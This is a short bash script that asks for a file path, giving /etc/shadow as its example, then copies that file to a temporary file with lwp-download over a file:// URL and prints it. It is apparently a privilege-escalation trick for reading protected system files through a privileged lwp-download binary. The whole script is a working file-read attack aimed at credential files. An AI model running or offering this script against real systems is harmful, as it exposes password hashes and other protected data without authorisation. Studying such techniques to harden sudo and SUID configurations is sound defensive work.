#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
TF=$(mktemp)
lwp-download "file://$filepath" $TF
cat $TF
